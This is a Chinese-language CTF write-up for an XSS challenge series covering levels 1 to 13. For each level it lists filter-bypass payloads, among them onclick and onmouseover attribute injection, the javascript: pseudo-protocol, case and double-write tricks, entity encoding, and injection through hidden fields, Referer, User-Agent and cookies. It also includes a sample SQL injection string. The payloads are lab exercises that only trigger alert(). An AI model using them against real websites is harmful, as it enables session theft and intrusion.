---
title: XSS Writeup
date: 2026-08-30 08:55:00
categories:
  - CTF wp
tags:
  - CTF
  - XSS
description: XSS Writeup
---

XSS大闯关(level_1—20)

## level_1

根据源码，没有过滤，直接调用windows.alert()这个函数。

![image.png](/img/ctf/xss-wp-001.png)


## leve_2

先输入`<script>windows.alert()</script>`发现对`<script>`过滤，所以输入`<img onerror>window.alert()</img onerror>`，没成功,说明过滤的是<>

![image-20250901141415738](/img/ctf/xss-wp-002.png)

所以输入`"onclick="window.alert()`![image-20250901141906029](/img/ctf/xss-wp-003.png)

### **onclick原理**：

1.`onclick` 是 HTML 的**事件处理器**，用于在元素被点击时执行 JavaScript 代码。在 XSS 场景中：

- 只要能让事件触发（如用户点击元素），代码就会执行。
- 很多 CTF 题目只要求证明 XSS 存在（即弹出`alert`），因此通过点击触发即可完成解题。

2.题目可能对 `<script>` 等明显的 XSS 标签进行过滤，但对事件属性（`onclick`、`onmouseover`等）过滤较弱：

- 相比 `<script>alert()</script>`，`onclick` 类 payload 更隐蔽，容易绕过基础过滤。
- 输入中的 `"` 可以打破属性封闭，将事件注入到标签中，避开对标签本身的检测。

## level_3（"闭合）

也输入`"onclick="window.alert()`

### level_2和3原理解释：

当我们提交`?keyword=" onclick="alert(1)`时，input 标签会变成：

```html
<input name="keyword" value="" onclick="alert(1)" />
```

- 第一个`"`闭合了原有的`value`属性引号
- `onclick="alert(1)"`被注入为新的事件属性
- 点击输入框时会触发`alert(1)`，进而触发页面自定义的`alert`函数，完成关卡

![image-20250901142530224](/img/ctf/xss-wp-004.png)

#### `htmlspecialchars()` ：

把预定义的字符转换为 HTML 实体。预定义的字符是：

- & （和号）成为 &
- " （双引号）成为 "
- ' （单引号）成为 '
- < （小于）成为 <
- \> （大于）成为 >

提示：如需把特殊的 HTML 实体转换回字符，请使用 `htmlspecialchars_decode()` 函数。

## level_5

同理，或者：

#### JavaScript伪协议：`"><a href=javascript:alert(/xss/)>`

![image-20250901143516130](/img/ctf/xss-wp-005.png)

## level_6

同样输入`"onclick="window.alert()`，发现变成了`"o_nclick="window.alert()`,试试`<script>windows.alert()</script>`也出现同样情况

![image-20250901143714633](/img/ctf/xss-wp-006.png)

![image-20250901143940439](/img/ctf/xss-wp-007.png)

说明对onclick和script会进行修改，所以试试`onclick"onclick="window.alert()`，第一个onclick用于被修改，使输入后变成`value="o_nclick"onclick="window.alert()"`，让`onclick="window.alert()"`正常执行

![image-20250901144321402](/img/ctf/xss-wp-008.png)

## level_6

同上题

也可使用大小写绕过`<ScRipt>alert(/xss/)</scRIpT>`

![image-20250901144804544](/img/ctf/xss-wp-009.png)

## level_7

先试试`"onclick="window.alert()`，过滤了on，试试`<script>windows.alert()</script>`，发现前面的`<script>`被过滤了，试试双写`<script>`：`"><scrscriptipt>alert()</scrscriptipt>`不太行，试试另一个双写`" oncliconclickk="alert(1)`不行，`onclick"onclick="window.alert()`成功了

![image-20250901185353503](/img/ctf/xss-wp-010.png)

## level_8

用上一题的方法竟然成功了，看看有没有别的方法

![image-20250901185605584](/img/ctf/xss-wp-011.png)

#### 编码绕过：

将一些字母用html实体编码和hex编码进行绕过，

例如：`<script>windows.alert()</script>`—>javasc&#x72;&#x69;pt:alert(/xss/)（这里用hex编码将script中的ri变成了&#x72;&#x69）

编码工具链接：https://www.qqxiuzi.cn/bianma/zifushiti.php

## level_9

试试`<script>windows.alert()</script>`，发现过滤了<和>,再试试`"onclick="window.alert()`，成了

![image-20250901191022895](/img/ctf/xss-wp-012.png)

## level_10

#### 隐藏表单字段注入：

![image-20250901192504634](/img/ctf/xss-wp-013.png)

源码中给了很多input，尝试请求的时候给出 **t_link**、**t_history** 和 **t_sort** 几个参数，发现 **t_sort** 的 value 字段对应其参数。举例来说，尝试这个 payload：
`?keyword=test?t_link=tlink&t_history=thist&t_sort=tsort`
![image-20250901192845252](/img/ctf/xss-wp-014.png)

发现**t_sort** 这个参数有效，就用这个payload包含执行代码
`?keyword=test&t_sort=" onmouseover=alert(1) type "`或着
`?keyword=test&t_sort=" onmouseover=javascript:alert(1) type "`(因为原来的type是hidden，所以也要过滤掉)

![image-20250901193639435](/img/ctf/xss-wp-015.png)

![](C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-09-01 193458.png)

## level_11  refere注入

![image-20250901194622050](/img/ctf/xss-wp-016.png)

和上题类似吧

先把每一个参数都是一遍，`?keyword=test?t_link=tlink&t_history=thistory&t_sort=tsort&t_ref=tref`，发现t_sort有用

![](/img/ctf/xss-wp-017.png)

发现`?keyword=test&t_sort="onmouseover=javascript:alert(1) type"`，结果出现&#34;,这里是把"自动转换了

![image-20250904134958052](/img/ctf/xss-wp-018.png)

### refere注入常见攻击场景

1. **XSS（跨站脚本）攻击**
   若应用会将`Referer`的值直接嵌入到页面 HTML 中（比如显示 “您从 xxx 页面跳转而来”），攻击者可在`Referer`中注入 JavaScript 代码。当页面渲染时，恶意代码会被执行，可能导致窃取 Cookie、会话劫持等后果。

   例：构造`Referer: <script>alert('xss')</script>`，若应用直接输出该值，页面会触发弹窗。

2. **SQL 注入**
   若应用将`Referer`的值用于数据库查询（比如记录访问来源到数据库），且未做过滤，攻击者可注入 SQL 语句篡改查询逻辑。

   例：构造`Referer: ' or 1=1--`，可能导致查询条件被绕过，泄露敏感数据。

3. **权限绕过**
   部分应用会通过`Referer`验证访问来源是否为可信域名（如限制仅允许从本网站跳转的请求）。攻击者可伪造`Referer`为可信域名，绕过这种验证机制，访问未授权资源。

使用refere注入（t_ref可能在提示refere），传入`"onmouseover=javascript:alert(1) type=".html`     (.html目的是使弹窗显示)

![image-20250904141307483](/img/ctf/xss-wp-019.png)

![image-20250904141355144](/img/ctf/xss-wp-020.png)

## leve_12

源码中给了一个UA，试试UA注入,`"onmouseover=javascript:alert(1) type=".html`

![image-20250904141721899](/img/ctf/xss-wp-021.png)

![image-20250904142143250](/img/ctf/xss-wp-022.png)

## level_13

这次可能是cookie，传cookie：" onmouseover=javascript:alert(1) type=".html

![image-20250904142239901](/img/ctf/xss-wp-023.png)

用hackbar不行
